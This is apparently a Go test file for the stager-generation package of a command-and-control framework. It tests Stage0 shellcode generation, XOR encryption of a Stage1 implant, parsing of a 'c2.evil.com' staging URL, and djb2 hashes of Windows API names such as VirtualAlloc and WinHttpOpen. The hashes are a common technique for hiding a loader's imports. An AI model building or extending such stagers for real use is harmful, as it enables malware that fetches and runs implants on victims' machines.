package stage

import (
	"testing"
)

func TestGenerateStage0(t *testing.T) {
	config := &StageConfig{
		ServerURL: "http://192.168.1.100:8080",
		PayloadID: "test-payload-001",
		AESKey:    make([]byte, 32),
	}
	for i := range config.AESKey {
		config.AESKey[i] = byte(i)
	}

	shellcode, err := GenerateStage0(config)
	if err != nil {
		t.Fatalf("GenerateStage0 failed: %v", err)
	}

	if len(shellcode) < 500 {
		t.Fatalf("shellcode too small: %d bytes (expected > 500)", len(shellcode))
	}

	t.Logf("Generated stager: %d bytes", len(shellcode))
	t.Logf("Checksum: %s", config.Checksum)

	info := GetStagerInfo(shellcode)
	if info == nil {
		t.Fatal("GetStagerInfo returned nil")
	}
	t.Logf("Stager info: %+v", info)

	// Verify shellcode starts with prologue (push rbp)
	if shellcode[0] != 0x55 {
		t.Errorf("expected prologue push rbp (0x55), got 0x%02X", shellcode[0])
	}

	// Verify shellcode contains epilogue ret (0xC3)
	// (data section is appended after code, so ret won't be at the very end)
	foundRet := false
	for i := 0; i < len(shellcode); i++ {
		if shellcode[i] == 0xC3 {
			foundRet = true
			t.Logf("Found ret instruction at offset %d (code section ends, data follows)", i)
			break
		}
	}
	if !foundRet {
		t.Errorf("expected epilogue ret (0xC3) not found in shellcode")
	}
}

func TestGenerateStage1(t *testing.T) {
	config := &StageConfig{
		ServerURL: "http://192.168.1.100:8080",
		PayloadID: "test-payload-001",
		AESKey:    make([]byte, 32),
	}
	for i := range config.AESKey {
		config.AESKey[i] = byte(i + 1)
	}

	implant := []byte("test payload data that should be encrypted")
	encrypted, err := GenerateStage1(config, implant)
	if err != nil {
		t.Fatalf("GenerateStage1 failed: %v", err)
	}

	if len(encrypted) == 0 {
		t.Fatal("encrypted output is empty")
	}

	t.Logf("Encrypted Stage1: %d bytes", len(encrypted))

	// Verify XOR-128 decryption roundtrip
	decrypted := xor128Decrypt(encrypted, config.AESKey[:16])

	if string(decrypted) != string(implant) {
		t.Fatalf("decryption mismatch:\n  expected: %q\n  got: %q", implant, decrypted)
	}
}

func TestXOR128Roundtrip(t *testing.T) {
	key := make([]byte, 16)
	for i := range key {
		key[i] = byte(i * 7)
	}

	tests := []struct {
		name  string
		input []byte
	}{
		{"empty", []byte{}},
		{"exact_block", make([]byte, 16)},
		{"one_byte", []byte{0x42}},
		{"multi_block", make([]byte, 48)},
		{"partial_block", make([]byte, 20)},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			enc := xor128Encrypt(tt.input, key)

			if len(tt.input) == 0 {
				if len(enc) != 0 {
					t.Errorf("empty input should produce empty output, got %d bytes", len(enc))
				}
			} else if len(enc)%16 != 0 {
				t.Errorf("encrypted length %d not multiple of 16", len(enc))
			}

			dec := xor128Decrypt(enc, key)

			if string(dec) != string(tt.input) {
				t.Errorf("roundtrip failed:\n  input: %v\n  output: %v", tt.input, dec)
			}
		})
	}
}

func TestParseURL(t *testing.T) {
	tests := []struct {
		url      string
		host     string
		path     string
		port     int
		hasError bool
	}{
		{"http://example.com", "example.com", "/", 80, false},
		{"https://example.com/api", "example.com", "/api", 443, false},
		{"http://192.168.1.1:8080", "192.168.1.1", "/", 8080, false},
		{"https://c2.evil.com:4443/path/to/stage", "c2.evil.com", "/path/to/stage", 4443, false},
	}

	for _, tt := range tests {
		host, path, port, err := parseURL(tt.url)
		if (err != nil) != tt.hasError {
			t.Errorf("parseURL(%q) error = %v, want error = %v", tt.url, err, tt.hasError)
			continue
		}
		if host != tt.host {
			t.Errorf("parseURL(%q) host = %q, want %q", tt.url, host, tt.host)
		}
		if path != tt.path {
			t.Errorf("parseURL(%q) path = %q, want %q", tt.url, path, tt.path)
		}
		if port != tt.port {
			t.Errorf("parseURL(%q) port = %d, want %d", tt.url, port, tt.port)
		}
	}
}

func TestWideString(t *testing.T) {
	tests := []struct {
		input string
		want  []byte
	}{
		{"A", []byte{'A', 0, 0, 0}},
		{"AB", []byte{'A', 0, 'B', 0, 0, 0}},
		{"", []byte{0, 0}},
	}

	for _, tt := range tests {
		got := toWideString(tt.input)
		if string(got) != string(tt.want) {
			t.Errorf("toWideString(%q) = %v, want %v", tt.input, got, tt.want)
		}
	}
}

func TestDJBDHash(t *testing.T) {
	// Verify known hash values
	tests := []struct {
		name string
		want uint32
	}{
		{"VirtualAlloc", 0x382C0F97},
		{"VirtualProtect", 0x844FF18D},
		{"LoadLibraryA", 0x5FBFF0FB},
		{"GetProcAddress", 0xCF31BB1F},
		{"WinHttpOpen", 0x5E4F39E5},
	}

	for _, tt := range tests {
		got := djb2Hash(tt.name)
		if got != tt.want {
			t.Errorf("djb2Hash(%q) = 0x%08X, want 0x%08X", tt.name, got, tt.want)
		}
	}
}
